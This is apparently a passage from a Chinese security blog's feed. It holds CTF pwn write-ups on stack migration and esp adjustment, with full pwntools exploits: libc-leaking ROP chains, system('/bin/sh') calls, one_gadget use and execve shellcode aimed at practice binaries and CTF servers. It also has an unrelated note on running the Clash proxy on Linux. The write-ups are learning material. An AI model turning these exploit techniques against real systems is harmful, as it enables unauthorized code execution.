or &#39;&#39;).encode(&#39;hex&#39;)))    return contentd = DynELF(leak, elf = elf)system_addr = d.lookup(&#39;system&#39;,&#39;libc&#39;)log.info(&#39;system_addr = %#x&#39; %system_addr)binsh_addr = 0x601068 - 8payload = padding * &#39;a&#39; + flat([0x0040075A,0,1,read_got,8,binsh_addr,0,0x00400740,&#39;\x00&#39;*56,start_add])payload = payload.ljust(200,&#39;b&#39;)io.send(payload)io.recvuntil(&#39;bye~\n&#39;)io.send(&#39;/bin/sh\x00&#39;)payload = padding * &#39;a&#39; + flat([pop_rdi,binsh_addr,system_addr])payload = payload.ljust(200,&#39;b&#39;)io.send(payload)io.interactive()</code></pre><h3 id="其他获取libc的方法"><a href="#其他获取libc的方法" class="headerlink" title="其他获取libc的方法"></a>其他获取libc的方法</h3><p>虽然DynELF是一个dump利器，但是如果写不出来leak函数，下libc被墙等等。就用这两个网站：<br><a href="http://libcdb.com/" target="_blank" rel="noopener">http://libcdb.com/</a><br><a href="https://libc.blukat.me/" target="_blank" rel="noopener">https://libc.blukat.me/</a><br>都是只有有两个泄露地址，就可以查到对应的libc版本，并且可以给出其原件，接着就可以进行其他操作。</p><p>还有在比赛过程中，如果一个题目不好获取到libc，那么可以看看其他题目的libc，有可能这个赛事平台服务器都是这个版本。</p>]]></content>
    
    
    
    <tags>
      
      <tag>pwn</tag>
      
      <tag>学习记录</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>linux下clash的使用</title>
    <link href="/2020/02/14/linux%E4%B8%8Bclash%E7%9A%84%E4%BD%BF%E7%94%A8/"/>
    <url>/2020/02/14/linux%E4%B8%8Bclash%E7%9A%84%E4%BD%BF%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="linux下clash的使用"><a href="#linux下clash的使用" class="headerlink" title="linux下clash的使用"></a>linux下clash的使用</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本文只是很简单记录一下，自己如何使用clash的。因为发现终端虽说在本机上已经开了代理，但是终端执行命令下载东西的时候十分的卡，今天才了解到，原来终端的代理是另外开的。所以就开始折腾一下，linux下clash的使用（本人用了很久了clash，所以直接看这个软件了）。</p><h2 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h2><p>执行<code>cd &amp;&amp; mkdir clash</code> 在用户目录下创建 clash 文件夹。<br>下载适合的 Clash 二进制文件并解压重命名为 clash,一般个人的64位电脑下载 clash-linux-amd64.tar.gz 即可。<br>地址：<a href="https://github.com/Dreamacro/clash/releases" target="_blank" rel="noopener">https://github.com/Dreamacro/clash/releases</a></p><h2 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h2><p>在终端cd到Clash二进制文件所在的目录,把Clash 配置文件给移进去。配置文件的名称要是config.yaml<br><img src="/2020/02/14/linux下clash的使用/images/15816946080116.jpg" srcset="/img/loading.gif" alt="-w286"></p><p>我是直接创建了这个文件，并写入的自己的配置，因为mac本机一直用这个软件，然后在配置文件找到主使用那个，直接复制那个自己使用代理网站加载下来的配置给config.yaml。</p><h2 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h2><p><code>chmod +x ./clash</code>加执行权限<br>执行 ./clash -d . 即可启动 Clash，同时启动 HTTP 代理和 Socks5 代理。<br>然后进入这个<a href="http://clash.razord.top/" target="_blank" rel="noopener">http://clash.razord.top/</a> 链接可以对代理进行个简单管理<br><img src="/2020/02/14/linux下clash的使用/images/15816952499188.jpg" srcset="/img/loading.gif" alt="-w794"></p><h2 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h2><p>打开系统设置，选择网络，点击网络代理右边的 ⚙ 按钮，选择手动，填写 HTTP 和 HTTPS 代理为 127.0.0.1:7890，填写 Socks 主机为 127.0.0.1:7891，即可启用系统代理。<br><img src="file:///Volumes/data/chumenblog/source/images/15816953014396.jpg" srcset="/img/loading.gif" alt="-w409"></p><h2 id="0x05"><a href="#0x05" class="headerlink" title="0x05"></a>0x05</h2><p>终端开启代理<br><code>export https_proxy=http://127.0.0.1:7890 http_proxy=http://127.0.0.1:7890 all_proxy=socks5://127.0.0.1:7891</code><br>执行这个命令即可。<br><img src="file:///Volumes/data/chumenblog/source/images/15816954013538.jpg" srcset="/img/loading.gif" alt="-w495"><br>出现这个就是代理成功了，然后就会发现终端下载东西的神速。</p>]]></content>
    
    
    
    <tags>
      
      <tag>linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Stack Migration题目练习</title>
    <link href="/2020/02/11/Stack%20Migration%E9%A2%98%E7%9B%AE%E7%BB%83%E4%B9%A0/"/>
    <url>/2020/02/11/Stack%20Migration%E9%A2%98%E7%9B%AE%E7%BB%83%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<h1 id="Stack-Migration题目练习"><a href="#Stack-Migration题目练习" class="headerlink" title="Stack Migration题目练习"></a>Stack Migration题目练习</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>记录几道Stack Migration的练习题。</p><h2 id="pwnable-simple-login"><a href="#pwnable-simple-login" class="headerlink" title="pwnable_simple_login"></a>pwnable_simple_login</h2><h3 id="查看保护和arch"><a href="#查看保护和arch" class="headerlink" title="查看保护和arch"></a>查看保护和arch</h3><pre><code class="c">    Arch:     i386-32-little    RELRO:    Partial RELRO    Stack:    Canary found    NX:       NX enabled    PIE:      No PIE (0x8048000)</code></pre><p>32位程序，开了nx和Canary保护。</p><h3 id="ida分析"><a href="#ida分析" class="headerlink" title="ida分析"></a>ida分析</h3><pre><code class="c">int __cdecl main(int argc, const char **argv, const char **envp){  int de_s; // [esp+18h] [ebp-28h]  char s; // [esp+1Eh] [ebp-22h]  unsigned int de_length; // [esp+3Ch] [ebp-4h]  memset(&amp;s, 0, 0x1Eu);  setvbuf(stdout, 0, 2, 0);  setvbuf(stdin, 0, 1, 0);  printf(&quot;Authenticate : &quot;);  _isoc99_scanf(&quot;%30s&quot;, &amp;s);  memset(&amp;input, 0, 0xCu);  de_s = 0;  de_length = Base64Decode((int)&amp;s, &amp;de_s);     // v6 = 解码后的长度  if ( de_length &gt; 0xC )  {    puts(&quot;Wrong Length&quot;);  }  else  {    memcpy(&amp;input, de_s, de_length);  // 执行完，把解码后的字段，放入input的bss内存上    if ( auth(de_length) == 1 )      correct();  }  return 0;}</code></pre><p>（其中已经改了部分变量的名称方便读代码）<br>流程就是接受一段base64编码过的字符串，然后进行一下解码，解码返回长度给变量，且做与12大小的比较，如果解码后大于12，就直接退出程序，并且解码的字符串是放在input的这个全局变量里：<br><img src="/2020/02/11/Stack Migration题目练习/images/15814303737109.jpg" srcset="/img/loading.gif" alt="-w601"><br>接着进入auth函数分析一下：</p><pre><code class="c">_BOOL4 __cdecl auth(int length){  char v2; // [esp+14h] [ebp-14h]  char *s2; // [esp+1Ch] [ebp-Ch]  int v4; // [esp+20h] [ebp-8h]  memcpy(&amp;v4, &amp;input, length);  s2 = (char *)calc_md5((int)&amp;v2, 12);  printf(&quot;hash : %s\n&quot;, s2);  return strcmp(&quot;f87cd601aa7fedca99018a8be88eda34&quot;, s2) == 0;}</code></pre><p>可以发现其是一个md5加密后，然后跟后面那串字符串对比。并且看一下v4变量：<br><img src="/2020/02/11/Stack Migration题目练习/images/15814310284289.jpg" srcset="/img/loading.gif" alt="-w407"><br>发现memcpy这个函数会引起栈溢出，但是可控的只是12-8 = 4字节。<img src="/2020/02/11/Stack Migration题目练习/images/15814313605840.jpg" srcset="/img/loading.gif" alt="-w1241"><br>然后输入12位‘1’，编码后放入程序，发现最后的4个字节被放入了ebp，正好这下就可以控制ebp了。接着就有了攻击思路：</p><h3 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h3><p>控制好这个ebp，然后由于这个程序中，auth函数最后有一个leave ret 的gadget，main函数也有一个，正好满足我们来Stack Migration。在栈上摆放的结构为：<br><img src="/2020/02/11/Stack Migration题目练习/images/15814316930734.jpg" srcset="/img/loading.gif" alt="-w353"><br>到时候由于memcpy会复制这个老栈的前12个字节的数据，然后new esp指向的是固定位置input。然后两个leave gadget即可</p><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><pre><code>from pwn import *from base64 import *# io = process(&#39;./login&#39;)io = remote(&#39;node3.buuoj.cn&#39;,29026)system_add = 0x08049284buf = 0x0811EB40io.recvuntil(&#39;e : &#39;)p = &#39;aaaa&#39; + p32(system_add) + p32(buf)io.sendline(b64encode(p))io.interactive()</code></pre><h2 id="安恒月赛-over-over"><a href="#安恒月赛-over-over" class="headerlink" title="安恒月赛_over.over"></a>安恒月赛_over.over</h2><h3 id="查保护和arch"><a href="#查保护和arch" class="headerlink" title="查保护和arch"></a>查保护和arch</h3><pre><code>[*] &#39;/media/psf/mypwn2/ichunqiu/stack_pivot/ah_over/over.over&#39;    Arch:     amd64-64-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x400000)</code></pre><p>64位，只开了nx</p><h3 id="ida分析-1"><a href="#ida分析-1" class="headerlink" title="ida分析"></a>ida分析</h3><pre><code>__int64 __fastcall main(__int64 a1, char **a2, char **a3){  setvbuf(stdin, 0LL, 2, 0LL);  setvbuf(stdout, 0LL, 2, 0LL);  while ( sub_400676() )    ;  return 0LL;}</code></pre><p>主函数十分简单，主要核心就在while包裹的函数:</p><pre><code>int sub_400676(){  char buf; // [rsp+0h] [rbp-50h]  memset(&amp;buf, 0, 0x50uLL);  putchar(&#39;&gt;&#39;);  read(0, &amp;buf, 0x60uLL);  return puts(&amp;buf);}</code></pre><p>可以看到溢出可控自己只有8个字节，也就是一个gadget，明显需要Stack Migration，<br>那么就得控制好ebp，padding即为0x50，但是这个题目没有给我们固定的地址，也就是没有全局变量可用，那就想办法看栈偏移了。</p><p>可以看到是read函数，和puts函数的搭配，当往里面塞0x50字节字符是不会添加上’\x00’的:<br><img src="/2020/02/11/Stack Migration题目练习/images/15814741030442.jpg" srcset="/img/loading.gif" alt="-w781"><br><img src="/2020/02/11/Stack Migration题目练习/images/15814741289950.jpg" srcset="/img/loading.gif" alt="-w649"></p><p>然后用puts函数输出时会把ebp里面的值也会输出出来。这下栈偏移是固定的，就可以在read的时候往里面塞rop链，依靠偏移来跳上去执行就可以了。<br><img src="/2020/02/11/Stack Migration题目练习/images/15814770925207.jpg" srcset="/img/loading.gif" alt="-w842"><br>算一下main的ebp与现在的esp差距是112个字节。让ebp-112就等于esp指向了栈顶esp。</p><h3 id="攻击思路-1"><a href="#攻击思路-1" class="headerlink" title="攻击思路"></a>攻击思路</h3><p>先给程序0x50个字节，然后接收下main的ebp值。然后程序由于while循环再次，进入这个函数，这时候送rop链，第一个rop链可以先泄露下puts的内存地址，然后计算libc的地址，返回地址写成主函数start，清理下栈。然后第二次读的时候，送过去system(/bin/sh)的rop链即可。程序每次读，构造好rop链的时候，要保证送过去80字节，然后控制ebp 为栈顶esp，还有加上leave 的gadget，这下两个leave的gadget就让程序跳回栈头的下个8个字节，开始执行rop链。</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *context.log_level = &#39;debug&#39;context.arch = &#39;amd64&#39;io = process(&#39;./over.over&#39;)e = ELF(&#39;./over.over&#39;)l = ELF(&#39;/lib/x86_64-linux-gnu/libc-2.23.so&#39;)leave_ret = 0x004006be pop_rdi_ret = 0x0400793put_got = e.got[&#39;puts&#39;]put_plt = e.symbols[&#39;puts&#39;]padding = 80raw_input(&#39;-&gt;&#39;)io.sendafter(&quot;&gt;&quot;, &#39;a&#39; * 80)# stack = u64(io.recvuntil(&quot;\x7f&quot;)[-6: ].ljust(8, &#39;\0&#39;)) - 0x70stack = u64((io.recvline())[80:86].ljust(8,&#39;\x00&#39;)) - 0x70io.readuntil(&#39;&gt;&#39;)print(hex(stack))p = flat([&#39;11111111&#39;,pop_rdi_ret,put_got,put_plt,0x000400580,(80-40)*&#39;1&#39;,stack,leave_ret])raw_input(&#39;-&gt;&#39;)io.send(p)libc = u64(io.recvuntil(&quot;\x7f&quot;)[-6: ].ljust(8, &#39;\0&#39;)) - l.symbols[&#39;puts&#39;]print(hex(libc))io.sendafter(&quot;&gt;&quot;, &#39;a&#39; * 80)stack = u64((io.recvline())[80:86].ljust(8,&#39;\x00&#39;)) - 0x70print(hex(stack))io.readuntil(&#39;&gt;&#39;)system_add = libc + l.symbols[&#39;system&#39;]binsh_add = libc + l.search(&#39;/bin/sh\x00&#39;).next()p = flat([&#39;22222222&#39;,pop_rdi_ret,binsh_add,system_add,(80-4*8)*&#39;2&#39;,stack,leave_ret])io.send(p)io.interactive()</code></pre><h2 id="HITCON-training-lab6"><a href="#HITCON-training-lab6" class="headerlink" title="HITCON_training_lab6"></a>HITCON_training_lab6</h2><h3 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h3><pre><code class="c">#include &lt;stdio.h&gt;int count = 1337 ;char *t= &quot;Z\xc3&quot; ;int main(){if( count!=1337 ){    _exit(1);}count++ ;char buf[48];setvbuf(stdout,0,2,0);puts(&quot;Try your best : &quot; );read(0, buf,128);return ;}</code></pre><p><code>gcc -m32 -z relro -z now -fno-stack-protector -mpreferred-stack-boundary=2 migration.c -o migration</code> 编译命令。<br>然后就不分析了，前面练习64位时候写的那个博客已经记录很清楚了，这里只记录下exp。</p><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><pre><code>from pwn import *context.arch = &#39;i386&#39;context.log_level = &#39;debug&#39;# io = process(&#39;./migration&#39;)io = remote(&#39;127.0.0.1&#39;,4000)e = ELF(&#39;./migration&#39;)l = ELF(&#39;/lib/i386-linux-gnu/libc-2.23.so&#39;)padding = 40puts_plt = e.symbols[&#39;puts&#39;]puts_got = e.got[&#39;puts&#39;]read = e.symbols[&#39;read&#39;]leave_ret = 0x08048418buf1 = 0x0804b000 - 0x100buf2 = buf1 - 0x50pop_edx_ret = 0x0804836dp = &#39;a&#39; * padding + flat([buf1,read,leave_ret,0,buf1,0x50])io.readuntil(&#39;:\n&#39;)io.send(p)p = flat([buf2,puts_plt,pop_edx_ret,puts_got,read,leave_ret,0,buf2,0x50])sleep(0.1)raw_input(&#39;-&gt;&#39;)io.sendline(p)puts_add = u32(io.recv(4))libc = puts_add - l.symbols[&#39;puts&#39;]print(hex(libc))system_add = l.symbols[&#39;system&#39;] + libcbinsh_add = l.search(&#39;/bin/sh\x00&#39;).next() + libcp = flat([buf1,system_add,system_add,binsh_add])raw_input(&#39;-&gt;&#39;)# sleep(0.1)io.sendline(p)io.interactive()</code></pre><h2 id="spwn"><a href="#spwn" class="headerlink" title="spwn"></a>spwn</h2><h3 id="查保护和arch-1"><a href="#查保护和arch-1" class="headerlink" title="查保护和arch"></a>查保护和arch</h3><pre><code>  Arch:     i386-32-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x8048000)</code></pre><h3 id="尝试运行"><a href="#尝试运行" class="headerlink" title="尝试运行"></a>尝试运行</h3><p><img src="/2020/02/11/Stack Migration题目练习/images/15817739064330.jpg" srcset="/img/loading.gif" alt="-w602"></p><h3 id="ida分析-2"><a href="#ida分析-2" class="headerlink" title="ida分析"></a>ida分析</h3><p>直接看漏洞函数</p><pre><code>ssize_t vul_function(){  size_t v0; // eax  size_t v1; // eax  char buf; // [esp+0h] [ebp-18h]  v0 = strlen(m1);  write(1, m1, v0);                             // Hello good Ctfer  read(0, &amp;s, 0x200u);  v1 = strlen(m2);  write(1, m2, v1);                             // What do you want to say?  return read(0, &amp;buf, 0x20u);}</code></pre><p>发现可以利用的gadget只有一个，那就只有leave的gadget了，然后把ebp控制到前面的read函数的s处，其也是全局变量，地址固定。<br><img src="/2020/02/11/Stack Migration题目练习/images/15817774030678.jpg" srcset="/img/loading.gif" alt="-w358"></p><h4 id="攻击思路-2"><a href="#攻击思路-2" class="headerlink" title="攻击思路"></a>攻击思路</h4><ol><li>在第一个read的时候，直接把构造的rop链读进去。任务分别是leak 一个函数的内存地址，来用libcseacher算出system，跟/bin/sh字符串的地址，返回start函数清理栈开启第二次使用漏洞； call system（/bin/sh）</li><li>然后第二个read时候，把控ebp指向固定地址s的地址，retaddress 放上leave的gadget。</li></ol><h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><pre><code>from pwn import *context.arch = &#39;i386&#39;context.log_level = &#39;debug&#39;from LibcSearcher import *e = ELF(&#39;./spwn&#39;)io = process(&#39;./spwn&#39;)# libc = e.libcio = remote(&#39;node3.buuoj.cn&#39;,28527)padding = 24s = 0x0804A300fake1 = 0x0804A500leave_ret = 0x08048511puts_add = e.symbols[&#39;puts&#39;]write_plt = e.symbols[&#39;write&#39;]write_got = e.got[&#39;write&#39;]io.recvuntil(&#39;name?&#39;)p = flat([fake1,write_plt,0x080483A0,1,write_got,10])io.send(p)io.recvuntil(&#39;say?&#39;)p = padding * &#39;a&#39; + p32(s) + p32(leave_ret)# raw_input(&#39;-&gt;&#39;)io.send(p)write_add = u32(io.recv(4))print(hex(write_add))obj = LibcSearcher(&#39;write&#39;,write_add)libc_base = write_add - obj.dump(&#39;write&#39;) #libc.symbols[&#39;write&#39;]print(hex(obj.dump(&#39;write&#39;)))print(hex(libc_base))sys_add = libc_base + obj.dump(&#39;system&#39;) #libc.symbols[&#39;system&#39;]binsh_add =libc_base + obj.dump(&#39;str_bin_sh&#39;) #libc.search(&#39;/bin/sh\x00&#39;).next()io.recvuntil(&#39;name?&#39;)p = flat([fake1,sys_add,0x080483A0,binsh_add])io.send(p)io.recvuntil(&#39;say?&#39;)p = padding * &#39;a&#39; + p32(s) + p32(leave_ret)io.send(p)io.interactive()</code></pre><h2 id="ACTF-2019-hardcore-fmt"><a href="#ACTF-2019-hardcore-fmt" class="headerlink" title="ACTF_ 2019_hardcore fmt"></a>ACTF_ 2019_hardcore fmt</h2><h3 id="查保护和arch-2"><a href="#查保护和arch-2" class="headerlink" title="查保护和arch"></a>查保护和arch</h3><pre><code>[*] &#39;/media/psf/mypwn2/buuctf/actf_2019_babystack/ACTF_2019_babystack&#39;    Arch:     amd64-64-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x400000)</code></pre><h3 id="ida分析-3"><a href="#ida分析-3" class="headerlink" title="ida分析"></a>ida分析</h3><p>￼￼￼￼<br><img src="http://q5j29gptn.bkt.clouddn.com/uPic/oj5gX3.png" srcset="/img/loading.gif" alt><br>其中可以看到后面的read处，存在一个栈溢出，但是只有一个gadget可以用，需要考虑Stack Migration。其中那个<strong>sub400a1a</strong>函数是问你需要留下多少的字节，肯定要<code>0xe0</code>，所以再送过去的时候就填入0xe0，正好做参数给下面read函数用。</p><p>然后程序接受到0xe0后，进入if语句中，会输出一下堆栈esp的值，这下也是相当于知道了一个特定的地址，然后就正常构造rop链，把控ebp等于为接收到的stack esp，再跟上leava gadget即可。</p><h3 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *from LibcSearcher import *context.log_level = &#39;debug&#39;context.arch = &#39;amd64&#39;# io = process(&#39;./ACTF_2019_babystack&#39;)# io = remote(&#39;node3.buuoj.cn&#39;,27626)io = remote(&#39;challenge-848a378609341016.sandbox.ctfhub.com&#39;, 24656)elf = ELF(&#39;./ACTF_2019_babystack&#39;)# libc = elf.libcio.recvuntil(&#39;message?\n&#39;)io.sendline(&#39;224&#39;)io.recvuntil(&#39;saved at&#39;)stack_addr =  int((io.recvline_contains(&#39;0x7f&#39;)),16)print(stack_addr)libc_start_main_got = elf.got[&#39;__libc_start_main&#39;]puts_plt = elf.symbols[&#39;puts&#39;]pop_rdi_ret = 0x000400ad3start_addr = 0x000400800leave_ret = 0x400a18 payload = flat([&#39;\x00&#39;*8,pop_rdi_ret,libc_start_main_got,puts_plt,start_addr])payload = payload.ljust(208,&#39;a&#39;)payload += flat([stack_addr,leave_ret])io.recvuntil(&#39;&gt;&#39;)raw_input(&#39;-&gt;&#39;)io.send(payload)io.recvuntil(&#39;bye~\n&#39;)libc_start_main_addr = u64(io.recv(6).ljust(8,&#39;\x00&#39;)) #- libc.symbols[&#39;__libc_start_main&#39;]obj = LibcSearcher(&#39;__libc_start_main&#39;,libc_start_main_addr)libc_base = libc_start_main_addr - obj.dump(&#39;__libc_start_main&#39;)print(hex(libc_base))io.recvuntil(&#39;message?\n&#39;)io.sendline(&#39;224&#39;)io.recvuntil(&#39;saved at&#39;)stack_addr =  int((io.recvline_contains(&#39;0x7f&#39;)),16)print(stack_addr)rec = libc_base + 0x4f2c5payload = flat([&#39;\x00&#39;*8,rec])payload = payload.ljust(208,&#39;\x00&#39;)payload += flat([stack_addr,leave_ret])io.recvuntil(&#39;&gt;&#39;)raw_input(&#39;-&gt;&#39;)io.send(payload)io.interactive()</code></pre>]]></content>
    
    
    
    <tags>
      
      <tag>pwn</tag>
      
      <tag>Stack Migration</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>花式栈溢出（栈帧的调节）</title>
    <link href="/2020/02/05/%E8%8A%B1%E5%BC%8F%E6%A0%88%E6%BA%A2%E5%87%BA%EF%BC%88%E8%B0%83%E8%8A%82%E6%A0%88%E5%B8%A7%EF%BC%89/"/>
    <url>/2020/02/05/%E8%8A%B1%E5%BC%8F%E6%A0%88%E6%BA%A2%E5%87%BA%EF%BC%88%E8%B0%83%E8%8A%82%E6%A0%88%E5%B8%A7%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h1 id="花式栈溢出（栈帧的调节）"><a href="#花式栈溢出（栈帧的调节）" class="headerlink" title="花式栈溢出（栈帧的调节）"></a>花式栈溢出（栈帧的调节）</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本人刚学pwn不久，最近在学习过程中学到了各种需要栈帧调节的题目，以此记录一下。<br>在一些栈溢出的程序中，我们会碰到一些问题，例如溢出的可控字节数太少，无法构造我们想要的rop链，程序ASLR开启后导致的栈地址不可预测等。对于这种问题，常用的思路包括：</p><ul><li>加减esp值，控制栈指针</li><li>Stack Migration来构造一个假的栈帧。</li></ul><p>这里总结了2种题型：</p><h2 id="加减esp，把控栈指针"><a href="#加减esp，把控栈指针" class="headerlink" title="加减esp，把控栈指针"></a>加减esp，把控栈指针</h2><p>这种题型就需要用Ropgadget找一个控制esp的gadget，然后简单修改esp值的大小，来满足我们的需求。</p><h3 id="Alictf-016-vss"><a href="#Alictf-016-vss" class="headerlink" title="Alictf_016_vss"></a>Alictf_016_vss</h3><p>这个题目就是一个修改esp扩大栈空间，从而构造rop链获取shell的题目。</p><h4 id="检查保护和arch"><a href="#检查保护和arch" class="headerlink" title="检查保护和arch"></a>检查保护和arch</h4><p><img src="http://qiqianyun.chumen77.xyz/15808931260368.jpg" srcset="/img/loading.gif" alt="-w446"></p><h4 id="ida分析"><a href="#ida分析" class="headerlink" title="ida分析"></a>ida分析</h4><p>由于这个程序使用静态编译和strip命令剥离符号，用ida打开没有我们平时看的那么简单，<br>很多函数已经无法识别，我们就需要自己调试，然后推测是什么函数。<br><img src="http://qiqianyun.chumen77.xyz/15808932166761.jpg" srcset="/img/loading.gif" alt="-w618"><br>start函数中，call的函数是__libc_start_main, 上一行的 offset则是main函数<br>那个箭头就是main函数了。进入main函数以后，<strong>可以经过syscall中rax的参数来确认其是什么函数</strong>，很明显一个函数是alarm函数，先手动nop一下。<br><img src="http://qiqianyun.chumen77.xyz/15808934501240.jpg" srcset="/img/loading.gif" alt="-w555"><br>把这个函数去除后，方便gdb的后期调试。接着可以很容易确定一下puts函数跟read函数，在ida中修改一下。<img src="http://qiqianyun.chumen77.xyz/15808936171885.jpg" srcset="/img/loading.gif" alt="-w528"><br>下面那个40108e函数是比较复杂的，我用edb动态调试来确定出其中的某些函数：<br><img src="http://qiqianyun.chumen77.xyz/15808938970186.jpg" srcset="/img/loading.gif" alt="-w857"><br>对于这个函数，先确定一下其参数。<br><img src="http://qiqianyun.chumen77.xyz/15808939630394.jpg" srcset="/img/loading.gif" alt="-w824"><br><img src="http://qiqianyun.chumen77.xyz/15808939828470.jpg" srcset="/img/loading.gif" alt="-w322"><br>dump过去就会发现是复制了一份。所以就确定这个函数是<code>strncpy</code>是函数。<br>对于这个函数<code>char *strncpy(char *dest, const char *src, int n)</code><strong>将src指向的字符数组中n个字符复制到dest指向的字符数组中，在第一个空字符处停止，并返回被复制后的dest</strong>。<br><img src="http://qiqianyun.chumen77.xyz/15808946102427.jpg" srcset="/img/loading.gif" alt="-w781"><br>对于下一段就是判断一下，是否与0x79和0x70相等，可以来手动修改值让其相等。<br><img src="http://qiqianyun.chumen77.xyz/15808947377600.jpg" srcset="/img/loading.gif" alt="-w803"><br>往后走会发现先溢出了，在做溢出题的时候看到return 就应该想办法想上跳。<br><img src="http://qiqianyun.chumen77.xyz/15808948243514.jpg" srcset="/img/loading.gif" alt="-w368"><br>溢出的这个地址就是刚刚又syrcpy函数复制过来0x50字节中的最后8个字节，因为是strncpy函数，<strong>我们输入的字符串中是不能有\x00</strong>，否则会被截断，从而无法复制满0x50字节制造可控溢出，所以前0x48个字节中，我们不能写入任何地址。在这种情况下就需要通过修改esp来完成漏洞利用。</p><p>在最前面的read函数中，给了十分大的缓冲区可以用，我们可以把ROP链放在0x50字节之后，然后通过增加esp的值把栈顶抬到ROP链上，紧接着执行这个rop链即可。</p><p>查到one_gadget发现<code>0x000000000046f205 : add rsp, 0x58 ; ret</code>正好符合要求。然后gdb调试一下确定一下rop链从50个字节后的那里开始合适即可。<strong>（这个在找onegadget的时候注意不要把rsp搞成esp了，自己在做的时候因为这个调试了半天，才发现是这个错误，导致exp不成功）</strong></p><h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><pre><code>from pwn import *import timeio = process(&#39;./vss&#39;)e = ELF(&#39;./vss&#39;)io.recvuntil(&#39;Password:\n&#39;)add_rsp_0x58_ret = 0x0046f205pop_rax_ret = 0x0046f208pop_rdi_ret = 0x0401823pop_rsi_ret = 0x0401937pop_rdx_ret = 0x043ae05bss = 0x6C8178 -10syscall_ret = 0x0045f2a5rop1 = [    pop_rax_ret,    0,    pop_rdi_ret,    0,    pop_rsi_ret,    bss,    pop_rdx_ret,    10,    syscall_ret,    pop_rax_ret,    0x3b,    pop_rdi_ret,    bss,    pop_rsi_ret,    0,    pop_rdx_ret,    0,    syscall_ret]# raw_input(&#39;-&gt;&#39;)io.sendline(&#39;py&#39; + &#39;a&#39;*70 + p64(add_rsp_0x58_ret)+ &#39;b&#39;* 8 + &#39;&#39;.join(map(p64,rop1)))# raw_input(&#39;-&gt;&#39;)sleep(0.1)io.send(&#39;/bin/sh\x00&#39;)io.interactive()</code></pre><h3 id="X-CTF-Quals-2016-b0verfl0w"><a href="#X-CTF-Quals-2016-b0verfl0w" class="headerlink" title="X-CTF Quals 2016-b0verfl0w"></a>X-CTF Quals 2016-b0verfl0w</h3><h4 id="查保护和arch"><a href="#查保护和arch" class="headerlink" title="查保护和arch"></a>查保护和arch</h4><p><img src="http://qiqianyun.chumen77.xyz/15811429422510.jpg" srcset="/img/loading.gif" alt="-w438"><br>这个nx也没有开，可以用栈执行shellcode</p><h4 id="ida分析-1"><a href="#ida分析-1" class="headerlink" title="ida分析"></a>ida分析</h4><pre><code>signed int vul(){  char s; // [esp+18h] [ebp-20h]  puts(&quot;\n======================&quot;);  puts(&quot;\nWelcome to X-CTF 2016!&quot;);  puts(&quot;\n======================&quot;);  puts(&quot;What&#39;s your name?&quot;);  fflush(stdout);  fgets(&amp;s, 50, stdin);  printf(&quot;Hello %s.&quot;, &amp;s);  fflush(stdout);  return 1;}</code></pre><p>代码很简单，但是可以发现可以溢出的字节只有50-0x20-4=14个字节可控，所以是很难写出rop链来获取咱们目的的。然后就可以考虑控制栈指针的攻击思路，就是先把shellcode摆在栈上，然后控制eip到达这里就可以了。但是由于程序本身会开启 ASLR 保护，所以我们很难直接知道 shellcode 的地址。但是栈上相对偏移是固定的，所以我们可以利用栈溢出对 esp 进行操作，使其指向 shellcode 处，并且直接控制程序跳转至 esp 处。</p><p>找一下控制esp的gadget<br>    0x08048504 : jmp esp<br>然后怎么控制eip到shellcode上呢，因为没有nx保护，我们可以写一段指令来控制偏移：</p><pre><code>sub esp,0x28jmp esp</code></pre><h4 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h4><pre><code>from pwn import *#io = process(&#39;./b0verfl0w&#39;)context.arch = &#39;i386&#39;io = remote(&#39;node3.buuoj.cn&#39;,29410)shellcode = &quot;\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73&quot;shellcode += &quot;\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0&quot;shellcode += &quot;\x0b\xcd\x80&quot;sub_esp_jmp = asm(&#39;sub esp, 0x28;jmp esp&#39;)jmp_esp = 0x08048504payload = shellcode + (36-len(shellcode_x86))*&#39;b&#39;+p32(jmp_esp) + sub_esp_jmpio.readuntil(&#39;?\n&#39;)#raw_input(&#39;-&gt;&#39;)io.sendline(payload)io.interactive()</code></pre><h2 id="Stack-Migration"><a href="#Stack-Migration" class="headerlink" title="Stack Migration"></a>Stack Migration</h2><p>在 Stack Migration 中，我们所利用的技巧便是同时控制 EBP 与 EIP，这样我们在控制程序执行流的同时，也改变程序栈帧的位置。</p><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>我们知道在函数建立栈帧时有两条指令<code>push ebp; mov ebp, esp</code>，而退出时同样需要消除这两条指令的影响，即<code>leave(mov esp, ebp; pop ebp)</code> 